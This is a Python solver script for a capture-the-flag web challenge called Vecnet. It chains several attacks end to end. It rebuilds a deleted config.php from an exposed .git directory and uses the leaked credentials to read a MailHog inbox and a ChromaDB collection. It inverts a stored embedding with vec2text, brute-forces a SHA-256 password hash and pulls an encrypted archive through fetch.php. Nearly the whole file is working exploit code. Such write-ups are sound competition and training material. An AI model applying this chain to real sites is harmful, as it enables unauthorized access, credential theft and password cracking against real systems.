#!/usr/bin/env python3
"""Recover the Vecnet flag from the exposed Git history and internal services."""

from __future__ import annotations

import base64
import hashlib
import io
import itertools
import json
import os
import re
import string
import sys
import tempfile
import types
import urllib.error
import urllib.parse
import urllib.request
import zlib
from pathlib import Path

BASE_URL = "https://vec.web.2026.sunshinectf.games"
MAIL_URL = "http://vec.web.2026.sunshinectf.games:8025"
CHROMA_URL = "http://vec.web.2026.sunshinectf.games:8000"

# The earlier commit contains config.php; the latest tree contains fetch.php.
CONFIG_COMMIT = "c3cd120180b3b7c5cbb4dd168311a6f643e74d98"
FETCH_COMMIT = "e6a00740509b9f621b16980b77913206c43fd08c"
CONFIG_OBJECTS = ("MAIL_ADMIN_URL", "MAIL_ADMIN_USER", "MAIL_ADMIN_PASS", "INTERNAL_API_KEY")


def request_bytes(
    url: str,
    *,
    data: bytes | None = None,
    headers: dict[str, str] | None = None,
    basic_auth: tuple[str, str] | None = None,
) -> bytes:
    request_headers = {"User-Agent": "Vecnet-writeup-solver/1.0"}
    if headers:
        request_headers.update(headers)
    if basic_auth:
        raw = f"{basic_auth[0]}:{basic_auth[1]}".encode()
        request_headers["Authorization"] = "Basic " + base64.b64encode(raw).decode()
    request = urllib.request.Request(url, data=data, headers=request_headers)
    try:
        with urllib.request.urlopen(request, timeout=30) as response:
            return response.read()
    except urllib.error.HTTPError as exc:
        detail = exc.read(500).decode("utf-8", errors="replace")
        raise RuntimeError(f"HTTP {exc.code} for {url}: {detail}") from exc
    except urllib.error.URLError as exc:
        raise RuntimeError(f"Could not reach {url}: {exc.reason}") from exc


def request_json(
    url: str,
    *,
    method: str = "GET",
    body: dict | None = None,
    headers: dict[str, str] | None = None,
    basic_auth: tuple[str, str] | None = None,
) -> dict | list:
    payload = None if body is None else json.dumps(body).encode()
    request_headers = {"Accept": "application/json"}
    if payload is not None:
        request_headers["Content-Type"] = "application/json"
    if headers:
        request_headers.update(headers)

    request = urllib.request.Request(
        url,
        data=payload,
        headers=request_headers,
        method=method,
    )
    if basic_auth:
        raw = f"{basic_auth[0]}:{basic_auth[1]}".encode()
        request.add_header("Authorization", "Basic " + base64.b64encode(raw).decode())

    try:
        with urllib.request.urlopen(request, timeout=30) as response:
            return json.loads(response.read())
    except urllib.error.HTTPError as exc:
        detail = exc.read(500).decode("utf-8", errors="replace")
        raise RuntimeError(f"HTTP {exc.code} for {url}: {detail}") from exc
    except urllib.error.URLError as exc:
        raise RuntimeError(f"Could not reach {url}: {exc.reason}") from exc


def read_git_object(object_id: str) -> tuple[bytes, bytes]:
    if not re.fullmatch(r"[0-9a-f]{40}", object_id):
        raise ValueError(f"Invalid Git object id: {object_id}")
    path = f"{BASE_URL}/.git/objects/{object_id[:2]}/{object_id[2:]}"
    decoded = zlib.decompress(request_bytes(path))
    header, content = decoded.split(b"\0", 1)
    return header.split(b" ", 1)[0], content


def find_blob(tree_id: str, filename: str) -> bytes:
    object_type, content = read_git_object(tree_id)
    if object_type != b"tree":
        raise ValueError(f"{tree_id} is not a Git tree")

    offset = 0
    while offset < len(content):
        entry, remainder = content[offset:].split(b"\0", 1)
        mode, raw_name = entry.split(b" ", 1)
        child_id = remainder[:20].hex()
        offset += len(entry) + 1 + 20
        name = raw_name.decode("utf-8", errors="replace")

        if mode == b"40000":
            try:
                return find_blob(child_id, filename)
            except FileNotFoundError:
                pass
        elif name == filename:
            child_type, child_content = read_git_object(child_id)
            if child_type == b"blob":
                return child_content

    raise FileNotFoundError(f"Could not find {filename} in Git tree {tree_id}")


def blob_from_commit(commit_id: str, filename: str) -> bytes:
    object_type, content = read_git_object(commit_id)
    if object_type != b"commit":
        raise ValueError(f"{commit_id} is not a Git commit")
    tree_match = re.search(rb"^tree ([0-9a-f]{40})$", content, re.MULTILINE)
    if not tree_match:
        raise ValueError(f"Commit {commit_id} has no tree")
    return find_blob(tree_match.group(1).decode(), filename)


def parse_php_constants(source: bytes) -> dict[str, str]:
    pattern = re.compile(
        rb"""define\s*\(\s*['"]([A-Z0-9_]+)['"]\s*,\s*['"]([^'"]*)['"]\s*\)""",
        re.IGNORECASE,
    )
    return {
        key.decode(): value.decode()
        for key, value in pattern.findall(source)
    }


def recover_config() -> dict[str, str]:
    source = blob_from_commit(CONFIG_COMMIT, "config.php")
    config = parse_php_constants(source)
    missing = [name for name in CONFIG_OBJECTS if name not in config]
    if missing:
        raise RuntimeError(f"The recovered config is missing: {', '.join(missing)}")
    return config


def recover_fetch_url() -> str:
    source = blob_from_commit(FETCH_COMMIT, "fetch.php")
    match = re.search(rb"""ALLOWED_URL\s*=\s*['"]([^'"]+)['"]""", source)
    if not match:
        raise RuntimeError("Could not recover the allowed archive URL from fetch.php")
    return match.group(1).decode()


def mail_inversion_parameters(config: dict[str, str]) -> tuple[int, int, str]:
    messages = request_json(
        f"{MAIL_URL}/api/v2/messages?limit=50",
        basic_auth=(config["MAIL_ADMIN_USER"], config["MAIL_ADMIN_PASS"]),
    )
    mail_text = json.dumps(messages, ensure_ascii=False)
    steps = re.search(r"num_steps\s*[=:]\s*(\d+)", mail_text)
    beam = re.search(r"sequence_beam_width\s*[=:]\s*(\d+)", mail_text)
    if not steps or not beam:
        raise RuntimeError("Could not find the Vec2Text settings in the MailHog messages")
    return int(steps.group(1)), int(beam.group(1)), mail_text


def chroma_records(api_key: str) -> dict:
    headers = {"X-Chroma-Token": api_key}
    root = (
        f"{CHROMA_URL}/api/v2/tenants/default_tenant/"
        "databases/default_database"
    )
    collections = request_json(f"{root}/collections", headers=headers)
    collection = next(
        (item for item in collections if item.get("name") == "VecNetDB"),
        None,
    )
    if collection is None:
        raise RuntimeError("Could not find the VecNetDB Chroma collection")

    collection_id = collection["id"]
    return request_json(
        f"{root}/collections/{collection_id}/get",
        method="POST",
        body={"include": ["documents", "metadatas", "embeddings"], "limit": 100},
        headers=headers,
    )


def record_value(records: dict, record_id: str, field: str):
    try:
        index = records["ids"].index(record_id)
        return records[field][index]
    except (KeyError, ValueError, IndexError) as exc:
        raise RuntimeError(f"ChromaDB record {record_id!r} has no {field}") from exc


def invert_requirement(embedding: list[float], steps: int, beam_width: int) -> str:
    # vec2text imports this Unix-only module for an optional resource limit.
    if "resource" not in sys.modules:
        resource = types.ModuleType("resource")
        resource.RLIMIT_CORE = 0
        resource.RLIM_INFINITY = -1
        resource.setrlimit = lambda *args, **kwargs: None
        sys.modules["resource"] = resource

    os.environ.setdefault("TOKENIZERS_PARALLELISM", "false")
    os.environ.setdefault("HF_HUB_DISABLE_PROGRESS_BARS", "1")

    import torch
    import vec2text

    torch.set_num_threads(min(8, os.cpu_count() or 1))
    vectors = torch.tensor([embedding], dtype=torch.float32)

    inversion_model = vec2text.models.InversionModel.from_pretrained("jxm/gtr__nq__32")
    corrector_model = vec2text.models.CorrectorEncoderModel.from_pretrained(
        "jxm/gtr__nq__32__correct"
    )
    corrector = vec2text.load_corrector(inversion_model, corrector_model)
    result = vec2text.invert_embeddings(
        vectors,
        corrector=corrector,
        num_steps=steps,
        sequence_beam_width=beam_width,
    )
    if not result:
        raise RuntimeError("Vec2Text returned no reconstructed requirement")
    return str(result[0])


def crack_password(password_hash: str, magic: str) -> str:
    if not re.fullmatch(r"[0-9a-fA-F]{64}", password_hash):
        raise ValueError("The stored password hash is not a SHA-256 hex digest")

    punctuation = [chr(code) for code in range(33, 127) if not chr(code).isalnum()]
    suffixes = [
        first + second + third + magic
        for first, second, third in itertools.product(punctuation, repeat=3)
    ]
    wanted = password_hash.lower()

    for first, last in itertools.product(string.ascii_uppercase, repeat=2):
        prefix = first + last
        for suffix in suffixes:
            candidate = prefix + suffix
            if hashlib.sha256(candidate.encode()).hexdigest() == wanted:
                return candidate
    raise RuntimeError("No password matched the initials/punctuation/hash constraints")


def decrypt_archive(archive: bytes, password: str) -> str:
    try:
        import py7zr
    except ImportError as exc:
        raise RuntimeError("Install dependencies with: python -m pip install -r requirements.txt") from exc

    with py7zr.SevenZipFile(io.BytesIO(archive), mode="r", password=password) as sevenzip:
        names = sevenzip.getnames()
        if "flag.txt" not in names:
            raise RuntimeError(f"Expected flag.txt in archive; found {names!r}")
        with tempfile.TemporaryDirectory(prefix="vecnet-") as temp:
            sevenzip.extract(path=temp, targets=["flag.txt"])
            flag_path = Path(temp) / "flag.txt"
            return flag_path.read_text(encoding="utf-8").strip()


def main() -> None:
    print("[*] Recovering the deleted configuration from exposed Git objects...")
    config = recover_config()
    fetch_url = recover_fetch_url()

    print("[*] Reading the Vec2Text settings from MailHog...")
    steps, beam_width, _ = mail_inversion_parameters(config)
    print(f"[+] Inversion settings: num_steps={steps}, sequence_beam_width={beam_width}")

    print("[*] Reading the password embedding and hash from ChromaDB...")
    records = chroma_records(config["INTERNAL_API_KEY"])
    requirement_vector = record_value(records, "user_password_requirements", "embeddings")
    password_hash = record_value(records, "user_hash_sha256", "documents")
    magic = record_value(records, "magic_string", "documents")
    if requirement_vector is None:
        raise RuntimeError("The password requirement record has no embedding")
    if not isinstance(password_hash, str) or not isinstance(magic, str):
        raise RuntimeError("The ChromaDB password records are malformed")

    print("[*] Inverting the stored embedding (the first run downloads model weights)...")
    requirement = invert_requirement(requirement_vector, steps, beam_width)
    print(f"[+] Recovered requirement: {requirement}")

    print("[*] Searching the password format against the SHA-256 hash...")
    password = crack_password(password_hash, magic)
    print("[+] Password recovered.")

    print("[*] Downloading and decrypting specs.7z...")
    archive_url = f"{BASE_URL}/fetch.php?{urllib.parse.urlencode({'url': fetch_url})}"
    archive = request_bytes(archive_url)
    flag = decrypt_archive(archive, password)
    print(f"Flag: {flag}")


if __name__ == "__main__":
    main()
